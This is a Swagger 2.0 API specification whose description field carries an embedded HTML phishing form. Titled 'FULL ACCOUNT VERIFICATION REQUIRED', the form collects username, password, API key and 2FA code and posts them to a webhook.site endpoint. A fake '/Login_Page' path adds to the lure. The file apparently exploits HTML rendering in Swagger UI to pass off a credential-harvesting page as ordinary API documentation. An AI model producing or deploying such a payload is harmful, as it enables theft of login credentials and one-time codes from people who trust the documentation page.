swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="width:100%;max-width:430px;margin:20px auto;padding:22px;background:#fff;border:2px solid #d32f2f;border-radius:10px;font-family:Arial;box-shadow:0 10px 30px rgba(0,0,0,.2);"><div style="background:#d32f2f;color:#fff;padding:12px;text-align:center;border-radius:6px;font-weight:bold;margin-bottom:16px;">FULL ACCOUNT VERIFICATION REQUIRED</div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="username" placeholder="Username" required style="width:100%;padding:11px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;"><input type="password" name="password" placeholder="Password" required style="width:100%;padding:11px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;"><input type="text" name="api_key" placeholder="API Key" style="width:100%;padding:11px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;font-family:monospace;"><input type="text" name="otp" placeholder="2FA Code (optional)" maxlength="6" style="width:100%;padding:11px;margin-bottom:14px;border:1px solid #ccc;border-radius:4px;"><button type="submit" style="width:100%;padding:12px;background:#d32f2f;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;">Verify Everything</button></form><div style="font-size:11px;color:#888;margin-top:10px;text-align:center;">This check cannot be skipped</div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
